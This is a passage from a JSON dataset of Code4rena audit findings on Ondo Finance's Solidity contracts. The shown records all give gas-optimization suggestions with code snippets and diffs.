866](https://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L866).\n\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L1281\n```solidity\nFile: /contracts/cash/CashManager.sol\n1281:    totalReservesNew = totalReserves - reduceAmount;\n```\n\nThe operation `totalReserves - reduceAmount` cannot underflow due to the check on [Line 1273](https://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L1273) that ensures that **totalReserves** is greater than **reduceAmount** before performing the arithemtic operation.\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CTokenModified.sol#L1284\n```solidity\nFile: /contracts/cash/CashManager.sol\n1284:    totalReservesNew = totalReserves - reduceAmount;\n```\nThe operation `totalReserves - reduceAmount` cannot underflow due to the check on [Line 1276](https://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L1276) that ensures that **totalReserves** is greater than **reduceAmount** before performing the arithemtic operation.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-13-using-unchecked-blocks-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6433",
      "title": "[G-12] x += y costs more gas than x = x + y for state variables",
      "impact": "GAS",
      "content": "\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L582\n\n**Saves 24 Gas on average**\n\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 1176    | 1420   | 1469 | 1469 |\n| After  | 1156    | 1396   | 1444 | 1444 |\n\n```solidity\nFile: /contracts/cash/CashManager.sol\n582:      currentEpoch += epochDifference;\n```\n\n```diff\ndiff --git a/contracts/cash/CashManager.sol b/contracts/cash/CashManager.sol\nindex 4eb4203..3156721 100644\n--- a/contracts/cash/CashManager.sol\n+++ b/contracts/cash/CashManager.sol\n@@ -579,7 +579,7 @@ contract CashManager is\n     if (epochDifference > 0) {\n       currentRedeemAmount = 0;\n       currentMintAmount = 0;\n-      currentEpoch += epochDifference;\n+      currentEpoch = currentEpoch + epochDifference;\n       currentEpochStartTimestamp =\n         block.timestamp -\n         (block.timestamp % epochDuration);\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L630\n```solidity\nFile: /contracts/cash/CashManager.sol\n630:    currentMintAmount += collateralAmountIn;\n\n649:    currentRedeemAmount += amount;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-12-x--y-costs-more-gas-than-x--x--y-for-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "6432",
      "title": "[G-11] Duplicated require()/revert() checks should be refactored to a modifier or function",
      "impact": "GAS",
      "content": "This saves deployment gas.\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CCash.sol#L151-L154\n```solidity\nFile: /contracts/lending/tokens/cCash/CCash.sol\n151:    require(\n152:      msg.sender == admin,\n153:      \"cErc20::sweepToken: only admin can sweep tokens\"\n154:    );\n```\n\nThe above check is also repeated on [Line 269](https://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CCash.sol#L269-L272)\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CErc20.sol#L151-L154\n```solidity\nFile: /contracts/lending/tokens/cToken/CErc20.sol\n151:    require(\n152:      msg.sender == admin,\n153:      \"cErc20::sweepToken: only admin can sweep tokens\"\n154:    );\n```\n\nRepeated on the following:\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CErc20.sol#L269-L272\n\n**Other instances**<br>\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CCashDelegate.sol#L30-L33\n```solidity\nFile: /contracts/lending/tokens/cCash/CCashDelegate.sol\n30:    require(\n31:      msg.sender == admin,\n32:      \"only the admin may call _becomeImplementation\"\n33:    );\n\n45:    require(\n46:      msg.sender == admin,\n47:      \"only the admin may call _resignImplementation\"\n48:    );\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CTokenDelegate.sol#L30-L33\n```solidity\nFile: /contracts/lending/tokens/cToken/CTokenDelegate.sol\n30:    require(\n31:      msg.sender == admin,\n32:      \"only the admin may call _becomeImplementation\"\n33:    );\n\n45:    require(\n46:      msg.sender == admin,\n47:      \"only the admin may call _resignImplementation\"\n48:    );\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L44\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n44:    require(msg.sender == admin, \"only admin may initialize the market\");\n```\nWe can have a modifier that checks that the msg.sender is the admin. Unless we really need to have different error messages we could generalize the errors for all functions that expect to be called by an admin. \n\nThe above check or a variation of it is found on the following lines\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L1064-L1066\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n1064:    if (msg.sender != admin) {\n1065:      revert SetPendingAdminOwnerCheck();\n1066:    }\n\n\n1116:    if (msg.sender != admin) {\n1117:      revert SetComptrollerOwnerCheck();\n1118:    }\n\n\n1155:    if (msg.sender != admin) {\n1156:      revert SetReserveFactorAdminCheck();\n1157:    }\n\n1258:    if (msg.sender != admin) {\n1259:      revert ReduceReservesAdminCheck();\n1260:    }\n\n1321:    if (msg.sender != admin) {\n1322:      revert SetInterestRateModelOwnerCheck();\n1323:    }\n\n1357:    require(msg.sender == admin, \"Only admin can set KYC requirement group\");\n\n1379:    require(msg.sender == admin, \"Only admin can set KYC registry\");\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CTokenModified.sol#L44\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n\n44:    require(msg.sender == admin, \"only admin may initialize the market\");\n\n1064:    if (msg.sender != admin) {\n1065:      revert SetPendingAdminOwnerCheck();\n1066:    }\n\n1116:    if (msg.sender != admin) {\n1117:      revert SetComptrollerOwnerCheck();\n1118:    }\n\n1155:    if (msg.sender != admin) {\n1156:      revert SetReserveFactorAdminCheck();\n1157:    }\n\n1261:    if (msg.sender != admin) {\n1262:      revert ReduceReservesAdminCheck();\n1263:    }\n\n1324:    if (msg.sender != admin) {\n1325:      revert SetInterestRateModelOwnerCheck();\n1326:    }\n\n1360:    require(msg.sender == admin, \"Only admin can set KYC requirement group\");\n\n1382:    require(msg.sender == admin, \"Only admin can set KYC registry\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-11-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "6431",
      "title": "[G-10] Refactor the code here to avoid storage readings",
      "impact": "GAS",
      "content": "**Note: I've added some explanations as to how/why this would work**\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CTokenModified.sol#L1256-L1295\n\n**1st instance**\n```solidity\nFile: /contracts/lending/tokens/cToken/CTokenModified.sol\n  function _reduceReservesFresh(uint reduceAmount) internal returns (uint) {\n\n    // Check caller is admin\n    if (msg.sender != admin) {\n      revert ReduceReservesAdminCheck();\n    }\n\n    doTransferOut(admin, reduceAmount);\n\n    emit ReservesReduced(admin, reduceAmount, totalReservesNew);\n```\n\nThe only way we get to `doTransferOut(admin, reduceAmount);` is if the `msg.sender` is equal to `admin`, therefore rather than use `admin` (storage variable) in the function call `doTransferOut(admin, reduceAmount);` we could use the cheaper `msg.sender`. Similar to the emit line , we could just emit `msg.sender`\n\n```diff\ndiff --git a/contracts/lending/tokens/cToken/CTokenModified.sol b/contracts/lending/tokens/cToken/CTokenModified.sol\nindex 8798b90..45b24da 100644\n--- a/contracts/lending/tokens/cToken/CTokenModified.sol\n+++ b/contracts/lending/tokens/cToken/CTokenModified.sol\n@@ -1287,9 +1287,9 @@ abstract contract CTokenModified is\n     totalReserves = totalReservesNew;\n\n     // doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.\n-    doTransferOut(admin, reduceAmount);\n+    doTransferOut(payable(msg.sender), reduceAmount);\n\n-    emit ReservesReduced(admin, reduceAmount, totalReservesNew);\n+    emit ReservesReduced(msg.sender, reduceAmount, totalReservesNew);\n\n     return NO_ERROR;\n   }\n```\n\n**2nd instance**<br>\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L1253-L1292\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n1253:  function _reduceReservesFresh(uint reduceAmount) internal returns (uint) {\n\n1257:    // Check caller is admin\n1258:    if (msg.sender != admin) {\n1259:      revert ReduceReservesAdminCheck();\n1260:    }\n\n1287:    doTransferOut(admin, reduceAmount);//@audit: use msg.sender here instead of admin\n\n1289:    emit ReservesReduced(admin, reduceAmount, totalReservesNew);//@audit: use msg.sender here \n```\n\n**3rd instance**<br>\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CCash.sol#L150-L161\n```solidity\nFile:/contracts/lending/tokens/cCash/CCash.sol\n150:  function sweepToken(EIP20NonStandardInterface token) external override {\n151:   require(\n152:      msg.sender == admin,\n153:      \"cErc20::sweepToken: only admin can sweep tokens\"\n154:    );\n\n160:    token.transfer(admin, balance);\n161:  }\n```\n\nSince we are checking that `msg.sender == admin`, it means the only way we get to line 160 is if the two are equal thus we can just use `msg.sender`(global variable - cheaper)  in `token.transfer(admin, balance);` rather than use `admin`(storage variable - expensive).\n\n```diff\ndiff --git a/contracts/lending/tokens/cCash/CCash.sol b/contracts/lending/tokens/cCash/CCash.sol\nindex 996283d..9f83506 100644\n--- a/contracts/lending/tokens/cCash/CCash.sol\n+++ b/contracts/lending/tokens/cCash/CCash.sol\n@@ -157,7 +157,7 @@ contract CCash is CTokenCash, CErc20Interface {\n       \"cErc20::sweepToken: can not sweep underlying token\"\n     );\n     uint256 balance = token.balanceOf(address(this));\n-    token.transfer(admin, balance);\n+    token.transfer(payable(msg.sender), balance);\n   }\n```\n\n**4th instance**<br>\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CCash.sol#L30-L56\n```solidity\nFile: /contracts/lending/tokens/cCash/CCash.sol\n30:  function initialize(\n\n53:    // Set underlying and sanity check it\n54:    underlying = underlying_; \n55:    EIP20Interface(underlying).totalSupply();\n56:  }\n```\n\nAs `underlying` (storage variable) is equal to `underlying_` (local variable) it would be cheaper to just read the local variable here `EIP20Interface(underlying).totalSupply();`\n\n```diff\ndiff --git a/contracts/lending/tokens/cCash/CCash.sol b/contracts/lending/tokens/cCash/CCash.sol\nindex 996283d..8e30298 100644\n--- a/contracts/lending/tokens/cCash/CCash.sol\n+++ b/contracts/lending/tokens/cCash/CCash.sol\n@@ -52,7 +52,7 @@ contract CCash is CTokenCash, CErc20Interface {\n\n     // Set underlying and sanity check it\n     underlying = underlying_;\n-    EIP20Interface(underlying).totalSupply();\n+    EIP20Interface(underlying_).totalSupply();\n   }\n```\n\n**5th instance**<br>\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CErc20.sol#L30-L56\n```solidity\nFile: /contracts/lending/tokens/cToken/CErc20.sol\n30:  function initialize(\n\n53:    // Set underlying and sanity check it\n54:    underlying = underlying_; \n55:    EIP20Interface(underlying).totalSupply();\n56:  }\n```\n\n```diff\ndiff --git a/contracts/lending/tokens/cToken/CErc20.sol b/contracts/lending/tokens/cToken/CErc20.sol\nindex 6998c56..3bb0011 100644\n--- a/contracts/lending/tokens/cToken/CErc20.sol\n+++ b/contracts/lending/tokens/cToken/CErc20.sol\n@@ -52,7 +52,7 @@ contract CErc20 is CTokenModified, CErc20Interface {\n\n     // Set underlying and sanity check it\n     underlying = underlying_;\n-    EIP20Interface(underlying).totalSupply();\n+    EIP20Interface(underlying_).totalSupply();\n   }\n```\n\n**6th instance**<br>\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CErc20.sol#L150-L161\n```solidity\nFile:/contracts/lending/tokens/cToken/CErc20.sol\n150:  function sweepToken(EIP20NonStandardInterface token) external override {\n151:   require(\n152:      msg.sender == admin,\n153:      \"cErc20::sweepToken: only admin can sweep tokens\"\n154:    );\n\n160:    token.transfer(admin, balance);\n161:  }\n```\nThe require statement ensures that `msg.sender == admin` therefore we can use `msg.sender` (global variable - cheap) in `token.transfer(admin, balance)` rather than `admin` (storage - expensive)\n\n```diff\ndiff --git a/contracts/lending/tokens/cToken/CErc20.sol b/contracts/lending/tokens/cToken/CErc20.sol\nindex 6998c56..2684cbf 100644\n--- a/contracts/lending/tokens/cToken/CErc20.sol\n+++ b/contracts/lending/tokens/cToken/CErc20.sol\n@@ -157,7 +157,7 @@ contract CErc20 is CTokenModified, CErc20Interface {\n       \"cErc20::sweepToken: can not sweep underlying token\"\n     );\n     uint256 balance = token.balanceOf(address(this));\n-    token.transfer(admin, balance);\n+    token.transfer(payable(msg.sender), balance);\n   }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-10-refactor-the-code-here-to-avoid-storage-readings",
      "tags": [],
      "finders": []
    },
    {
      "id": "6430",
      "title": "[G-09] Using storage instead of memory for structs/arrays saves gas",
      "impact": "GAS",
      "content": "\nWhen fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read. Instead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a memory variable, is if the full struct/array is being returned by the function, is being passed to a function that requires memory, or if the array/struct is being read from another memory array/struct\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/OndoPriceOracleV2.sol#L284\n```solidity\nFile: /contracts/lending/OndoPriceOracleV2.sol\n284:    ChainlinkOracleInfo memory chainlinkInfo = fTokenToChainlinkOracle[fToken];\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-09-using-storage-instead-of-memory-for-structsarrays-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6429",
      "title": "[G-08] Emitting storage values instead of the memory one.",
      "impact": "GAS",
      "content": "Here, the values emitted shouldnâ€™t be read from storage. The existing memory values should be used instead:\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/JumpRateModelV2.sol#L171-L190\n\n```solidity\nFile: /contracts/lending/JumpRateModelV2.sol\n 171: function updateJumpRateModelInternal(\n\n182:    kink = kink_;\n\n184:    emit NewInterestParams(\n185:      baseRatePerBlock,\n186:      multiplierPerBlock,\n187:      jumpMultiplierPerBlock,\n188:      kink\n189:    );\n190:  }\n```\n\n```diff\ndiff --git a/contracts/lending/JumpRateModelV2.sol b/contracts/lending/JumpRateModelV2.sol\nindex a3971c6..cc525bb 100644\n--- a/contracts/lending/JumpRateModelV2.sol\n+++ b/contracts/lending/JumpRateModelV2.sol\n@@ -185,7 +185,7 @@ contract JumpRateModelV2 is InterestRateModel {\n       baseRatePerBlock,\n       multiplierPerBlock,\n       jumpMultiplierPerBlock,\n-      kink\n+      kink_\n     );\n   }\n }\n```\n\n**Other instances**\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L817-L823\n\n```solidity\nFile: /contracts/cash/CashManager.sol\n\n//@audit: we should emit newRedeemMinimum instead of minimumRedeemAmount\n817:  function setRedeemMinimum(\n818:    uint256 newRedeemMinimum\n819:  ) external onlyRole(MANAGER_ADMIN) {\n820:    uint256 oldRedeemMin = minimumRedeemAmount;\n821:    minimumRedeemAmount = newRedeemMinimum;\n822:    emit MinimumRedeemAmountSet(oldRedeemMin, minimumRedeemAmount);\n823:  }\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cErc20ModifiedDelegator.sol#L720-L747\n\n```solidity\nFile: /contracts/lending/tokens/cErc20ModifiedDelegator.sol\n\n//@audit: We should emit implementation_ instead of implementation\n720:  function _setImplementation(\n721:    address implementation_,\n722:    bool allowResign,\n723:    bytes memory becomeImplementationData\n724:  ) public {\n\n736:    address oldImplementation = implementation;\n737:    implementation = implementation_;\n\n746:    emit NewImplementation(oldImplementation, implementation);\n747:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-08-emitting-storage-values-instead-of-the-memory-one",
      "tags": [],
      "finders": []
    },
    {
      "id": "6428",
      "title": "[G-07] Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
      "content": "\nCaching a mapping's value in a local storage or calldata variable when the value is accessed multiple times saves ~42 gas per access due to not having to perform the same offset calculation every time.<br>\n**Help the Optimizer by saving a storage variable's reference instead of repeatedly fetching it**\n\nTo help the optimizer,declare a storage type variable and use it instead of repeatedly fetching the reference in a map or an array.<br>\nAs an example, instead of repeatedly calling `someMap[someIndex]`, save its reference like this: `SomeStruct storage someStruct = someMap[someIndex]` and use it.\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L662-L686\n\n### CashManager.sol.requestRedemption(): redemptionInfoPerEpoch[currentEpoch] should be cached in storage\n```solidity\nFile:/contracts/cash/CashManager.sol\n662:  function requestRedemption(\n\n678:    redemptionInfoPerEpoch[currentEpoch].addressToBurnAmt[\n679:        msg.sender\n680:      ] += amountCashToRedeem;\n681:    redemptionInfoPerEpoch[currentEpoch].totalBurned += amountCashToRedeem;\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/cash/CashManager.sol#L851-L876\n\n### CashManager.sol.setPendingRedemptionBalance(): redemptionInfoPerEpoch[epoch] should be cached in local storage\n```solidity\nFile:/contracts/cash/CashManager.sol\n851:  function setPendingRedemptionBalance(\n\n859:    uint256 previousBalance = redemptionInfoPerEpoch[epoch].addressToBurnAmt[\n860:      user\n861:    ];\n\n864:    if (balance < previousBalance) {\n865:      redemptionInfoPerEpoch[epoch].totalBurned -= previousBalance - balance;\n866:    } else if (balance > previousBalance) {\n867:      redemptionInfoPerEpoch[epoch].totalBurned += balance - previousBalance;\n868:    }\n869:    redemptionInfoPerEpoch[epoch].addressToBurnAmt[user] = balance;\n870:    emit PendingRedemptionBalanceSet(\n871:      user,\n872:      epoch,\n873:      balance,\n874:      redemptionInfoPerEpoch[epoch].totalBurned\n875:    );\n876:  }\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L720-L721\n\n### CTokenCash.sol.borrowFresh(): accountBorrows[borrower] should be cached in local storage\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n720:    accountBorrows[borrower].principal = accountBorrowsNew;//@audit: Initial access\n721:    accountBorrows[borrower].interestIndex = borrowIndex;//@audit: 2nd access\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L822-L823\n\n### CTokenCash.sol.repayBorrowFresh(): accountBorrows[borrower] should be cached in local storage\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n822:    accountBorrows[borrower].principal = accountBorrowsNew; //@audit: Initial access\n823:    accountBorrows[borrower].interestIndex = borrowIndex;//@audit: 2nd access\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CTokenModified.sol#L720-L721\n\n### CTokenModified.sol.borrowFresh(): accountBorrows[borrower] should be cached in local storage\n```solidity\nFile:/contracts/lending/tokens/cToken/CTokenModified.sol\n720:    accountBorrows[borrower].principal = accountBorrowsNew;//@audit: Initial access\n721:    accountBorrows[borrower].interestIndex = borrowIndex;//@audit: 2nd access\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cToken/CTokenModified.sol#L822-L823\n\n### CTokenModified.sol.repayBorrowFresh(): accountBorrows[borrower] should be cached in local storage\n```solidity\nFile:/contracts/lending/tokens/cToken/CTokenModified.sol\n822:   accountBorrows[borrower].principal = accountBorrowsNew;//@audit: Initial access\n823:   accountBorrows[borrower].interestIndex = borrowIndex;//@audit: 2nd access\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/OndoPriceOracleV2.sol#L251-L267\n\n### OndoPriceOracleV2.sol.\\_setFTokenToChainlinkOracle(): fTokenToChainlinkOracle\\[fToken] should be cached in local storage\n```solidity\nFile: /contracts/lending/OndoPriceOracleV2.sol\n251:  function _setFTokenToChainlinkOracle(\n\n260:    fTokenToChainlinkOracle[fToken].scaleFactor = (10 **\n261:      (36 -\n262:        uint256(IERC20Like(underlying).decimals()) -\n263:        uint256(AggregatorV3Interface(chainlinkOracle).decimals()))); //@audit: Initial access\n264:    fTokenToChainlinkOracle[fToken].oracle = AggregatorV3Interface(\n265:      chainlinkOracle\n266:    );//@audit: 2nd access\n267:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-07-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache",
      "tags": [],
      "finders": []
    },
    {
      "id": "6427",
      "title": "[G-06] Internal/Private functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\nNot inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.\n\nAffected code:\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/OndoPriceOracle.sol#L119\n```solidity\nFile: /contracts/lending/OndoPriceOracle.sol\n119:  function _setFTokenToCToken(address fToken, address cToken) internal {\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/OndoPriceOracleV2.sol#L210\n```solidity\nFile: /contracts/lending/OndoPriceOracleV2.sol\n210:  function _setFTokenToCToken(address fToken, address cToken) internal {\n\n251:  function _setFTokenToChainlinkOracle(\n252:    address fToken,\n253:    address chainlinkOracle\n254:  ) internal {\n\n324:  function _min(uint256 a, uint256 b) internal pure returns (uint256) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-06-internalprivate-functions-only-called-once-can-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6426",
      "title": "[G-05] Cache the mapping values rather than fetch it every time",
      "impact": "GAS",
      "content": "\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/OndoPriceOracle.sol#L61-L72\n\n### OndoPriceOracle.sol.getUnderlyingPrice(): fTokenToUnderlyingPrice[fToken] should be cached\n```solidity\nFile: /contracts/lending/OndoPriceOracle.sol\n61:  function getUnderlyingPrice(\n62:    address fToken\n63:  ) external view override returns (uint256) {\n64:    if (fTokenToUnderlyingPrice[fToken] != 0) { //@audit: Initial access\n65:      return fTokenToUnderlyingPrice[fToken];//@audit: 2nd access\n66:    } else {\n```\n\n```diff\ndiff --git a/contracts/lending/OndoPriceOracle.sol b/contracts/lending/OndoPriceOracle.sol\nindex 471769e..ddfc781 100644\n--- a/contracts/lending/OndoPriceOracle.sol\n+++ b/contracts/lending/OndoPriceOracle.sol\n@@ -61,8 +61,9 @@ contract OndoPriceOracle is IOndoPriceOracle, Ownable {\n   function getUnderlyingPrice(\n     address fToken\n   ) external view override returns (uint256) {\n-    if (fTokenToUnderlyingPrice[fToken] != 0) {\n-      return fTokenToUnderlyingPrice[fToken];\n+    uint256 _fTokenToUnderlyingPrice = fTokenToUnderlyingPrice[fToken];\n+    if (_fTokenToUnderlyingPrice != 0) {\n+      return _fTokenToUnderlyingPrice;\n     } else {\n       // Price is not manually set, attempt to retrieve price from Compound's\n       // oracle\n```\n\nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/OndoPriceOracleV2.sol#L114-L116\n\n### OndoPriceOracleV2.sol.getUnderlyingPrice(): fTokenToUnderlyingPriceCap\\[fToken\\] should be cached\n```solidity\nFile: /contracts/lending/OndoPriceOracleV2.sol\n114:    if (fTokenToUnderlyingPriceCap[fToken] > 0) { //@audit: Initial access\n115:      price = _min(price, fTokenToUnderlyingPriceCap[fToken]);//@audit: 2nd access\n116:    }\n```\n\n### Use the cached value here \nhttps://github.com/code-423n4/2023-01-ondo/blob/f3426e5b6b4561e09460b2e6471eb694efdd6c70/contracts/lending/tokens/cCash/CTokenCash.sol#L50-L55\n```solidity\nFile: /contracts/lending/tokens/cCash/CTokenCash.sol\n50:    // Set initial exchange rate\n51:    initialExchangeRateMantissa = initialExchangeRateMantissa_;//@audit: Cached here\n52:    require(\n53:      initialExchangeRateMantissa > 0, //@audit: Use the cached value\n54:      \"initial exchange rate must be greater than zero.\"\n55:    );\n```\n\n```diff\ndiff --git a/contracts/lending/tokens/cCash/CTokenCash.sol b/contracts/lending/tokens/cCash/CTokenCash.sol\nindex 93d5000..9f0f7da 100644\n--- a/contracts/lending/tokens/cCash/CTokenCash.sol\n+++ b/contracts/lending/tokens/cCash/CTokenCash.sol\n@@ -50,7 +50,7 @@ abstract contract CTokenCash is\n     // Set initial exchange rate\n     initialExchangeRateMantissa = initialExchangeRateMantissa_;\n     require(\n-      initialExchangeRateMantissa > 0,\n+      initialExchangeRateMantissa_ > 0,\n       \"initial exchange rate must be greater than zero.\"\n     );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-01-ondo",
      "github_link": "#g-05-cache-the-mapping-values-rather-than-fetch-it-every-time",
      "tags": [],
      "finders": []
    },
    {
      "id": "6425",
      "title": "[G-04] The result of a function call should be cached rather than re-calling the function",
      "impact": "GAS",
